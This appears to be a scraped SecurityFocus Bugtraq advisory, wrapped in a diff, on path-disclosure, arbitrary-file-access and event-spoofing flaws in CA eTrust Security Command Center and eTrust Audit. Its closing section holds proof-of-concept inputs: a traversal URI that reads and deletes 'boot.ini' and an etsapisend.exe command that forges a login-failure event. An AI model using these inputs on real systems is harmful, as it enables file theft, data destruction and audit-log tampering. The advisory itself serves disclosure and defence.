@@ -1,0 +1,116 @@
+#SpeeDr00t@Black Falcon<br>#bid20139<p><b><span style="font-size: 18pt;">CA eTrust Security Command Center and eTrust Audit Multiple Vulnerabilities</span></b></p><br><br><a href="http://www.securityfocus.com/bid/20139/info">info</a><br><a href="http://www.securityfocus.com/bid/20139/discuss">discussion</a><br><a href="http://www.securityfocus.com/bid/20139/exploit">exploit</a><br><a href="http://www.securityfocus.com/bid/20139/solution">solution</a><br><a href="http://www.securityfocus.com/bid/20139/references">references</a><br><br><br><br><br>#<br>#<div id="vulnerability">
+<span class="title"></span><br/><br/>
+<table border="0" cellpadding="4" cellspacing="0">
+<tr>
+<td>
+<span class="label">Bugtraq ID:</span>
+</td>
+<td>
+				20139
+			</td>
+</tr>
+<tr>
+<td>
+<span class="label">Class:</span>
+</td>
+<td>
+				Unknown
+			</td>
+</tr>
+<tr valign="top">
+<td>
+<span class="label">CVE:</span>
+</td>
+<td>
+				
+					 CVE-2006-4899<br/>
+				
+					CVE-2006-4900<br/>
+				
+					CVE-2006-4901<br/>
+</td>
+</tr>
+<tr>
+<td>
+<span class="label">Remote:</span>
+</td>
+<td>
+				Yes
+			</td>
+</tr>
+<tr>
+<td>
+<span class="label">Local:</span>
+</td>
+<td>
+				Yes
+			</td>
+</tr>
+<tr>
+<td>
+<span class="label">Published:</span>
+</td>
+<td>
+				Sep 21 2006 12:00AM
+			</td>
+</tr>
+<tr>
+<td>
+<span class="label">Updated:</span>
+</td>
+<td>
+				Jun 26 2007 04:18AM
+			</td>
+</tr>
+<tr>
+<td>
+<span class="label">Credit:</span>
+</td>
+<td>
+				Patrick Webster is credited with discovering these vulnerabilities.
+			</td>
+</tr>
+<tr valign="top">
+<td>
+<span class="label">Vulnerable:</span>
+</td>
+<td>
+				
+					Computer Associates eTrust Security Command Center  r8 SP1 CR2<br/>
+					
+				
+					Computer Associates eTrust Security Command Center  r8 SP1 CR1<br/>
+					
+				
+					Computer Associates eTrust Security Command Center  r8<br/>
+					
+				
+					Computer Associates eTrust Security Command Center  1.0<br/>
+					
+				
+					Computer Associates eTrust Audit  r8<br/>
+					
+				
+					Computer Associates eTrust Audit  1.5<br/>
+</td>
+</tr>
+<tr>
+<td colspan="2">
+<div class="breakline"></div>
+</td>
+</tr>
+<tr valign="top">
+<td>
+<span class="label">Not Vulnerable:</span>
+</td>
+<td>
+</td>
+</tr>
+</table>
+</div><br><br>#<br>##no_exploit_link<br><br><br><br>#<br>#<div id="vulnerability">
+<span class="title"></span><br/><br/>
+	Attackers may exploit these issues using a web browser or the 'etsapisend.exe' executeable.<br/><br/>The following URI demonstrates the path-disclosure issue:<br/>https://www.example.com:8080/etrust/servlet/ePPIServlet?PIProfile=eAV_Report's&amp;PIName=Generate+Pre-7.1+Report+Data&amp;profile= Threat+Management&amp;node=<br/><br/>The following URI demonstrates the arbitrary-file-access/removal issue by retrieving 'boot.ini' and then deleting it:<br/>https://www.example.com:8080/etrust/servlet/eSMPAuditServlet?verb=getadhochtml&amp;eSCCAdHocHtmlFile=../../../../../../../boot.ini<br/><br/>The following command-line example will send a login-failure event:<br/>etsapisend.exe -nod $dstIP -cat "System Access" -opr Logon -sta F -nam NT-Security -loc \\Domain\IIS_Server -usr System -evt 70 -src Security -nid 529 -inf "Logon Failure"
+	
+		<ul>
+</ul>
+</div>
